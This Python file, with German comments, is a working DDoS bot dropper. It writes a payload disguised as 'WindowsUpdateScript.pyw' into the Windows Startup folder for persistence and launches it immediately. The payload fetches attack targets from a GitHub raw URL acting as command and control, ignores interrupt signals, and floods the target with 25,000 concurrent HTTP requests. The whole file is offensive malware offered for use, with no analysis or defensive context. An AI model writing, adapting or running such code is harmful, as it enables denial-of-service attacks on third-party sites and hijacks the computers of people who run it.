import os
import sys
import textwrap
import subprocess
import time

ZIEL_ORDNER = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")

ZIEL_DATEI = "WindowsUpdateScript.pyw"

PAYLOAD = textwrap.dedent("""\
import subprocess
import sys

required_packages = [
        "aiohttp",
        "requests"
]

for package in required_packages:
    try:
        if package == "discord.py":
            __import__("discord")
        elif package == "pillow":
            __import__("PIL")
        else:
            __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import asyncio
import aiohttp
import requests
import threading
import time
import signal

GITHUB_RAW_URL = "https://raw.githubusercontent.com/NyveXgg/refdgdfsgdffdsfdsfdsfdgdfsgfs68658fasd865f7568a6sd657586das56dsa5f678d758a7dfgerergrefdgfdgdfgfdfdgs/refs/heads/main/ddos.raw"
CONCURRENT_TASKS = 25000

# Typischer Browser-User-Agent
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

current_target = None
target_lock = threading.Lock()

def debug_log(msg):
    print(f"[DEBUG] {msg}")

def ignore_sigint(signum, frame):
    debug_log("")  # bleibt leer, wie gewünscht

signal.signal(signal.SIGINT, ignore_sigint)

def fetch_target_sync():
    try:
        # Header für requests
        headers = {"User-Agent": USER_AGENT}
        resp = requests.get(GITHUB_RAW_URL, timeout=3, headers=headers)
        if resp.status_code != 200:
            debug_log(f"github link status {resp.status_code}")
            return None
        intermediate = resp.text.strip()

        resp = requests.get(intermediate, timeout=3, headers=headers)
        if resp.status_code != 200:
            debug_log(f"zielseite status {resp.status_code}")
            return None
        content = resp.text

        lines = [line.strip() for line in content.splitlines() if line.strip()]
        if not lines:
            debug_log("kein target")
            return None
        target = lines[0]
        return target
    except Exception as e:
        debug_log(f"fehler im updater-thread: {e}")
        return None

def updater_thread():
    global current_target
    while True:
        target = fetch_target_sync()
        with target_lock:
            if target is None:
                if current_target is not None:
                    debug_log("ziel ungültig")
                current_target = None
            else:
                if current_target != target:
                    debug_log(f"ziel gewechselt zu {target}")
                current_target = target

        time.sleep(4)

async def flood_worker(session):
    while True:
        with target_lock:
            target = current_target
        if target:
            try:
                await session.get(target, timeout=0.5, ssl=False)
            except Exception:
                pass
        else:
            await asyncio.sleep(0.001)

async def main():
    debug_log("starte DDoS")
    # Connector mit optimierten Einstellungen
    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=0,
        force_close=True
    )
    # Session mit eigenem User-Agent
    headers = {"User-Agent": USER_AGENT}
    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        debug_log("warte target")
        while current_target is None:
            await asyncio.sleep(0.5)
        debug_log(f"erstes target erhalten: {current_target}")

        workers = [asyncio.create_task(flood_worker(session)) for _ in range(CONCURRENT_TASKS)]
        debug_log(f"{CONCURRENT_TASKS} worker gestartet")

        try:
            await asyncio.gather(*workers)
        except Exception as e:
            debug_log(f"fehler in worker-gather: {e}")

if __name__ == "__main__":
    t = threading.Thread(target=updater_thread, daemon=True)
    t.start()

    while True:
        try:
            asyncio.run(main())
        except Exception as e:
            debug_log(f"Kritischer Fehler, Neustart in 5s: {e}")
            time.sleep(5)
""")

def main():
    if os.name != 'nt':
        print("Dieses Skript ist nur für Windows vorgesehen.")
        sys.exit(1)

    ziel_pfad = os.path.join(ZIEL_ORDNER, ZIEL_DATEI)

    os.makedirs(ZIEL_ORDNER, exist_ok=True)

    with open(ziel_pfad, "w", encoding="utf-8") as f:
        f.write(PAYLOAD)

    # ===== Den Payload sofort starten (im Hintergrund) =====
    print("Starte Payload...")
    subprocess.Popen([sys.executable, ziel_pfad])

if __name__ == "__main__":
    main()
